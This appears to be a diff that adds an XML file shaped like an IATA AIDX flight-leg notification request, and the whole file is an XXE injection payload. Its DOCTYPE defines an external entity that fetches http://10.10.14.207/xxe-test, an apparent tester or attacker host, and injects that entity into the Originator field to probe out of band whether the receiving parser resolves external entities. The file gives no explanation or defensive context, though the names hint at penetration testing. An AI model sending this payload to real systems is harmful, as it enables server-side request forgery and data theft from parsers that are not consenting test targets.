@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
+  <!ENTITY xxe SYSTEM "http://10.10.14.207/xxe-test">
+]>
+<IATA_AIDX_FlightLegNotifRQ>
+  <Originator>&xxe;</Originator>
+  <FlightLeg>
+    <LegIdentifier>TEST123</LegIdentifier>
+  </FlightLeg>
+</IATA_AIDX_FlightLegNotifRQ>
